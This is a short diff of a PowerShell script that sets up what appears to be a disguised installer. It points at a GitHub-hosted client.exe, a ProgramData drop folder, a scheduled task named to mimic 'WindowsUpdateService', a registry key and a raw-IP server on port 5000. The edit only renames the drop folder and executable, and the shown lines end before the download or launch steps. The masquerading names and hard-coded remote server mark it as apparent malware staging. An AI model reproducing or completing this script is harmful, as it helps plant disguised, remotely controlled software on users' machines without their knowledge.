@@ -1,11 +1,11 @@
 $url = "https://github.com/timbundon/cab-314/releases/latest/download/client.exe"
-$dir = "$env:ProgramData\WindowsUpdate"
-$file = "$dir\Update.exe"
+$dir = "$env:ProgramData\Updater"
+$file = "$dir\Updater.exe"
 $taskName = "WindowsUpdateService"
 $regPath = "HKCU:\Software\cab-314"
 $serverUrl = "http://26.116.201.168:5000"
 
-taskkill /f /im Update.exe 2>$null
+taskkill /f /im Updater.exe 2>$null
 
 if (!(Test-Path $dir)) { New-Item -Path $dir -ItemType Directory -Force }
 if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force }
